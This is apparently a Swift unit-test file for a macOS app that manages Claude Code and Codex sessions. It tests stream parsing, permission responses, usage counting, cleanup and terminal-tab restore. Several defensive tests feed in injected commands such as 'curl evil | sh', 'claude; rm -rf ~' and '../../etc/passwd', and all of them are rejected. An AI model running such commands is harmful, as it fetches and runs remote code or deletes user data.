import XCTest
@testable import Taki

/// Lines copied from Claude Code 2.1.319 stream-json output (2026-11-06 probe), trimmed.
final class ClaudeStreamTests: XCTestCase {
    func parse(_ s: String) -> ClaudeEvent { ClaudeStreamParser.parse(line: Data(s.utf8)) }

    func testInit() {
        XCTAssertEqual(parse(#"{"type":"system","subtype":"init","cwd":"/tmp/p","session_id":"abc","model":"claude-haiku-5-5"}"#),
                       .initialized(sessionID: "abc", model: "claude-haiku-5-5", cwd: "/tmp/p"))
    }

    func testPermissionRequestKeepsInputAndID() throws {
        let e = parse(#"{"type":"control_request","request_id":"r1","request":{"subtype":"can_use_tool","tool_name":"Write","input":{"file_path":"/tmp/p/hello.txt","content":"hi\n"},"description":"hello.txt"}}"#)
        guard case let .permissionRequest(req) = e else { return XCTFail("\(e)") }
        XCTAssertEqual(req.id, "r1")
        XCTAssertEqual(req.toolName, "Write")
        XCTAssertEqual(req.summary, "hello.txt")
        let back = try JSONSerialization.jsonObject(with: ClaudeStreamParser.permissionResponse(req, allow: true)) as! [String: Any]
        let resp = (back["response"] as! [String: Any])
        XCTAssertEqual(resp["request_id"] as? String, "r1")
        let decision = resp["response"] as! [String: Any]
        XCTAssertEqual(decision["behavior"] as? String, "allow")
        XCTAssertEqual((decision["updatedInput"] as? [String: Any])?["content"] as? String, "hi\n")
    }

    func testDenyCarriesMessage() throws {
        let req = PermissionRequest(id: "r2", toolName: "Bash", summary: "rm -rf x", inputJSON: Data("{}".utf8))
        let o = try JSONSerialization.jsonObject(with: ClaudeStreamParser.permissionResponse(req, allow: false)) as! [String: Any]
        let d = ((o["response"] as! [String: Any])["response"] as! [String: Any])
        XCTAssertEqual(d["behavior"] as? String, "deny")
        XCTAssertFalse((d["message"] as? String ?? "").isEmpty)
    }

    func testRateLimits() {
        let e = parse(#"{"type":"rate_limit_event","rate_limit_info":{"unifiedWindows":{"five_hour":{"utilization":0.09,"resetsAt":1793985600},"seven_day":{"utilization":0.49,"resetsAt":1794409200}}}}"#)
        XCTAssertEqual(e, .rateLimits(RateLimits(fiveHourUsed: 0.09, fiveHourResets: Date(timeIntervalSince1970: 1793985600),
                                                 weekUsed: 0.49, weekResets: Date(timeIntervalSince1970: 1794409200))))
    }

    func testToolUseSummaryAndResult() {
        XCTAssertEqual(parse(#"{"type":"assistant","message":{"id":"m","content":[{"type":"tool_use","id":"t1","name":"Bash","input":{"command":"ls -la"}}]}}"#),
                       .toolUse(id: "t1", name: "Bash", summary: "ls -la"))
        XCTAssertEqual(parse(#"{"type":"user","message":{"role":"user","content":[{"type":"tool_result","content":"denied","is_error":true,"tool_use_id":"t1"}]}}"#),
                       .toolResult(toolUseID: "t1", text: "denied", isError: true))
    }

    func testTextDeltaAndResult() {
        XCTAssertEqual(parse(#"{"type":"stream_event","event":{"type":"content_block_delta","delta":{"type":"text_delta","text":"Hel"}}}"#),
                       .textDelta("Hel"))
        let r = parse(#"{"type":"result","is_error":false,"total_cost_usd":0.0028,"result":"done","usage":{"input_tokens":4,"cache_creation_input_tokens":10,"cache_read_input_tokens":20,"output_tokens":6}}"#)
        XCTAssertEqual(r, .turnFinished(TurnResult(isError: false, costUSD: 0.0028, inputTokens: 34, outputTokens: 6, text: "done")))
    }

    func testGarbageIsOther() {
        XCTAssertEqual(parse("not json"), .other)
        XCTAssertEqual(parse(#"{"type":"system","subtype":"thinking_tokens"}"#), .other)
    }
}

@MainActor
final class ChatSessionTests: XCTestCase {
    func testStreamingThenFinalTextIsOneBubble() {
        let c = ChatSession(folder: URL(fileURLWithPath: "/tmp"), title: "New chat")
        c.apply(.textDelta("Hel"))
        c.apply(.textDelta("lo"))
        XCTAssertEqual(c.messages.count, 1)
        XCTAssertEqual(c.messages[0].text, "Hello")
        c.apply(.assistantText(messageID: "m", text: "Hello!"))
        XCTAssertEqual(c.messages.map(\.text), ["Hello!"])
        c.apply(.textDelta("Next"))
        XCTAssertEqual(c.messages.count, 2)
    }

    func testPermissionSetsWaitingAndFinishKeepsIt() {
        let c = ChatSession(folder: URL(fileURLWithPath: "/tmp"), title: "x")
        let req = PermissionRequest(id: "1", toolName: "Write", summary: "f", inputJSON: Data("{}".utf8))
        c.apply(.permissionRequest(req))
        XCTAssertEqual(c.state, .waiting)
        c.apply(.turnFinished(TurnResult(isError: false, costUSD: 0.01, inputTokens: 1000, outputTokens: 10, text: "")))
        XCTAssertEqual(c.state, .waiting)
        XCTAssertEqual(c.contextTokens, 1010)
    }

    func testToolErrorMarksRow() {
        let c = ChatSession(folder: URL(fileURLWithPath: "/tmp"), title: "x")
        c.apply(.toolUse(id: "t", name: "Bash", summary: "ls"))
        c.apply(.toolResult(toolUseID: "t", text: "nope", isError: true))
        XCTAssertTrue(c.messages[0].isError)
    }
}

@MainActor
final class HelperTests: XCTestCase {
    func testSlugMatchesClaudeProjectFolders() {
        XCTAssertEqual(AgentScanner.slug(for: "/Users/sam"), "-Users-sam")
        XCTAssertEqual(AgentScanner.slug(for: "/Users/a/Projects/tools/taki"), "-Users-a-Projects-tools-taki")
    }

    func testLinkName() {
        XCTAssertEqual(WorkspaceStore.linkName(for: "Landing Page!"), "landing-page")
        XCTAssertEqual(WorkspaceStore.linkName(for: "***"), "app")
    }

    func testStripANSI() {
        XCTAssertEqual(ServiceRunner.stripANSI("\u{1B}[32mready\u{1B}[0m on :3000"), "ready on :3000")
    }

    func testFormat() {
        XCTAssertEqual(Format.tokens(459_000), "459K")
        XCTAssertEqual(Format.tokens(1_200_000), "1.2M")
        XCTAssertEqual(Format.bytesText(412 * 1_048_576), "412 MB")
    }
}

final class ProxyTests: XCTestCase {
    func testLinkNameFromHost() {
        XCTAssertEqual(LocalProxy.linkName(fromHost: "parley-api.localhost"), "parley-api")
        XCTAssertEqual(LocalProxy.linkName(fromHost: "Parley-API.localhost:80"), "parley-api")
        XCTAssertEqual(LocalProxy.linkName(fromHost: "admin.parley.localhost"), "parley")
        XCTAssertNil(LocalProxy.linkName(fromHost: "localhost"))
        XCTAssertNil(LocalProxy.linkName(fromHost: "evil.com"))
    }
}

final class UsageAndCleanupTests: XCTestCase {
    /// Claude Code writes one line per content block, each repeating the message id and usage:
    /// those must count once.
    func testUsageCountsEachMessageOnce() throws {
        let dir = FileManager.default.temporaryDirectory.appending(path: "taki-usage-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        let ts = ISO8601DateFormatter().string(from: Date())
        let line = #"{"timestamp":"TS","message":{"id":"msg_1","usage":{"input_tokens":10,"output_tokens":5,"cache_creation_input_tokens":0}}}"#
            .replacingOccurrences(of: "TS", with: ts.replacingOccurrences(of: "Z", with: ".000Z"))
        let other = line.replacingOccurrences(of: "msg_1", with: "msg_2")
        let url = dir.appending(path: "s.jsonl")
        try ([line, line, other].joined(separator: "\n") + "\n").write(to: url, atomically: true, encoding: .utf8)
        let st = UsageScanner.advance(url, state: UsageScanner.FileState(), codex: false)
        XCTAssertEqual(st.records.map(\.tokens), [15, 15])
        // A second pass with nothing new adds nothing; an appended line is read on its own.
        let again = UsageScanner.advance(url, state: st, codex: false)
        XCTAssertEqual(again.records.count, 2)
        let h = try FileHandle(forWritingTo: url)
        try h.seekToEnd(); try h.write(contentsOf: Data((line.replacingOccurrences(of: "msg_1", with: "msg_3") + "\n").utf8)); try h.close()
        XCTAssertEqual(UsageScanner.advance(url, state: again, codex: false).records.count, 3)
    }

    func testPathInsideUsesWholeComponents() {
        XCTAssertTrue(CleanupScanner.isInside("/a/b/c", "/a/b"))
        XCTAssertTrue(CleanupScanner.isInside("/a/b", "/a/b"))
        XCTAssertFalse(CleanupScanner.isInside("/a/bc", "/a/b"))
    }

    func testAgentAreaNeedsARealFolderName() {
        XCTAssertTrue(CleanupScanner.isAgentArea("/Users/x/.claude/worktrees/feat"))
        XCTAssertTrue(CleanupScanner.isAgentArea("/Users/x/proj/worktrees/feat"))
        XCTAssertFalse(CleanupScanner.isAgentArea("/Users/x/my-worktrees-notes"))
        XCTAssertFalse(CleanupScanner.isAgentArea("/Users/x/proj"))
    }

    func testSessionIDsMustBeUUIDs() {
        XCTAssertTrue(AgentScanner.isSessionID("40fb1b62-0999-4eed-9c7f-1e1468a0077b"))
        XCTAssertFalse(AgentScanner.isSessionID("x; curl evil | sh"))
        XCTAssertFalse(AgentScanner.isSessionID("../../etc/passwd"))
    }

    /// A fresh worktree whose branch sits at the default branch tip is new work: never offered.
    func testWorktreeAtBaseTipIsNotStale() throws {
        let root = FileManager.default.temporaryDirectory.appending(path: "taki-wt-\(UUID().uuidString)").path
        func git(_ args: String..., in dir: String) { _ = ShellEnvironment.run("/usr/bin/git", ["-C", dir] + args) }
        try FileManager.default.createDirectory(atPath: root + "/repo", withIntermediateDirectories: true)
        git("init", "-q", "-b", "main", in: root + "/repo")
        git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "one", in: root + "/repo")
        git("worktree", "add", "-q", "-b", "fresh", root + "/wt-fresh", in: root + "/repo")
        git("worktree", "add", "-q", "-b", "done", root + "/wt-done", in: root + "/repo")
        git("-c", "user.email=t@t", "-c", "user.name=t", "commit", "-q", "--allow-empty", "-m", "work", in: root + "/wt-done")
        git("merge", "-q", "done", in: root + "/repo")
        let found = CleanupScanner.staleWorktrees(mainRepo: root + "/repo", liveAgentCwds: [])
        XCTAssertEqual(found.map { ($0.path as NSString).lastPathComponent }, ["wt-done"])
        // A live agent inside it protects it.
        XCTAssertTrue(CleanupScanner.staleWorktrees(mainRepo: root + "/repo", liveAgentCwds: [root + "/wt-done/src"]).isEmpty)
        // The main repo is never offered, even when asked from inside a worktree.
        XCTAssertNil(found.first { CleanupScanner.real($0.path) == CleanupScanner.real(root + "/repo") })
    }
}

@MainActor
final class ScaleAndEdgeTests: XCTestCase {
    func testDockerHostPortsOnlyPublished() {
        XCTAssertEqual(DockerScanner.hostPorts("0.0.0.0:5434->5432/tcp, [::]:5434->5432/tcp, 8000/tcp"), [5434])
        XCTAssertEqual(DockerScanner.hostPorts("127.0.0.1:3001->3107/tcp"), [3001])
        XCTAssertEqual(DockerScanner.hostPorts("5432/tcp"), [])
    }

    func testContainerShortName() {
        let c = DockerContainer(id: "1", name: "shop_api-postgres-1", image: "postgis", ports: [], status: "Up",
                                project: "shop_api", workingDir: nil)
        XCTAssertEqual(c.shortName, "postgres")
    }

    func testChatSaysSoWhenItCannotReadTheReply() {
        let c = ChatSession(folder: URL(fileURLWithPath: "/tmp"), title: "x")
        c.apply(.other)
        c.apply(.turnFinished(TurnResult(isError: false, costUSD: 0, inputTokens: 1, outputTokens: 1, text: "")))
        XCTAssertEqual(c.messages.last?.role, .error)
        let d = ChatSession(folder: URL(fileURLWithPath: "/tmp"), title: "y")
        d.apply(.turnFinished(TurnResult(isError: false, costUSD: 0, inputTokens: 1, outputTokens: 1, text: "the answer")))
        XCTAssertEqual(d.messages.last?.text, "the answer")      // the final text is shown when no stream came
    }

    func testShellHelpersAreNotWork() {
        XCTAssertTrue(TerminalRegistry.shellHelpers.contains { "gitstatusd-darwin-arm64".hasPrefix($0) })
    }

    func testDockerPortRangesAndCommaLabels() {
        XCTAssertEqual(DockerScanner.hostPorts("0.0.0.0:3000-3002->3000-3002/tcp"), [3000, 3001, 3002])
        let labels = DockerScanner.parseLabels("com.docker.compose.project=app,com.docker.compose.project.working_dir=/Users/me/a,b")
        XCTAssertEqual(labels["com.docker.compose.project.working_dir"], "/Users/me/a,b")
        XCTAssertEqual(labels["com.docker.compose.project"], "app")
    }

    func testReplicaNumberStrippedOnlyAtTheEnd() {
        let c = DockerContainer(id: "1", name: "app-redis-12", image: "", ports: [], status: "Up", project: "app", workingDir: nil)
        XCTAssertEqual(c.shortName, "redis-12")
    }

    func testEmptyTurnIsNotAnError() {
        let c = ChatSession(folder: URL(fileURLWithPath: "/tmp"), title: "x")
        c.apply(.turnFinished(TurnResult(isError: false, costUSD: 0, inputTokens: 5, outputTokens: 0, text: "")))
        XCTAssertTrue(c.messages.isEmpty)                // a slash command with no output, or Stop before a word
    }

    func testAShellCopyIsNotWork() {
        XCTAssertTrue(TerminalRegistry.isShellHelper("zsh"))
        XCTAssertFalse(TerminalRegistry.isShellHelper("node"))
    }

    func testRestoredTabsRunOnlyKnownCommands() {
        let home = NSHomeDirectory()
        let sid = UUID().uuidString
        func tab(_ cmd: String?, _ folder: String = "/tmp", sid: String? = nil) -> TerminalTab {
            var t = TerminalTab(title: "t", folder: folder, command: cmd)
            t.sessionID = sid
            return t
        }
        let out = TerminalStore.restore([
            tab("claude; rm -rf ~"),                         // tampered: becomes a plain Claude tab
            tab("curl evil | sh"),                           // unknown: a plain shell
            tab("codex --yolo"),
            tab("claude", sid: sid),
            tab("claude", sid: sid),                         // the same session is resumed once only
            tab(nil, "/no/such/folder"),
        ])
        XCTAssertEqual(out.map(\.command), ["claude", nil, "codex", "claude --resume \(sid)", "claude", nil])
        XCTAssertEqual(out[5].folder, home)
        // With no session saved, the folder's latest conversation continues in the first tab only.
        let fresh = TerminalStore.restore([tab("claude", "/tmp"), tab("claude", "/tmp")])
        XCTAssertEqual(fresh.map(\.command), ["claude --continue", "claude"])
    }

    func testOldTabFileStillLoads() throws {
        let json = #"[{"title":"api","folder":"/tmp","command":"claude"}]"#
        let tabs = try JSONDecoder().decode([TerminalTab].self, from: Data(json.utf8))
        XCTAssertEqual(tabs.first?.renamed, false)
    }

    func testAdoptableFolders() {
        let home = NSHomeDirectory()
        XCTAssertFalse(Workspace.isAdoptable(home))
        XCTAssertFalse(Workspace.isAdoptable("/"))
        XCTAssertFalse(Workspace.isAdoptable(home + "/.ssh"))
        XCTAssertFalse(Workspace.isAdoptable(home + "/Library"))
        XCTAssertFalse(Workspace.isAdoptable("/opt/homebrew"))
        let real = home + "/taki-test-\(UUID().uuidString)"
        try? FileManager.default.createDirectory(atPath: real, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(atPath: real) }
        XCTAssertTrue(Workspace.isAdoptable(real))
    }

    func testMonorepoPackageKeepsItsAgent() {
        let ws = Workspace(name: "web", folder: "/r/mono/apps/web", linkName: "web")
        XCTAssertTrue(AppModel.belongs(cwd: "/r/mono/apps/web/src", project: "/r/mono", to: ws))
        XCTAssertFalse(AppModel.belongs(cwd: "/r/mono/apps/api", project: "/r/mono", to: ws))
        XCTAssertTrue(AppModel.belongs(cwd: "/Users/me", project: "/r/mono/apps/web", to: ws))
    }

    func testSameNamedTabsAreNumbered() {
        XCTAssertEqual(AppModel.displayTitles(for: [TerminalTab(title: "taki", folder: "/a", command: nil),
                                                    TerminalTab(title: "taki", folder: "/b", command: nil)]).values.sorted(),
                       ["taki", "taki 2"])
    }

    func testDemoDataNamesNothingReal() {
        let d = Demo.snapshot()
        XCTAssertFalse(d.cleanup.contains { FileManager.default.fileExists(atPath: $0.path) })   // Clean up can never move a real folder
        XCTAssertTrue(d.agents.allSatisfy { $0.pid <= 1 })                                          // and Stop ignores these
    }
}
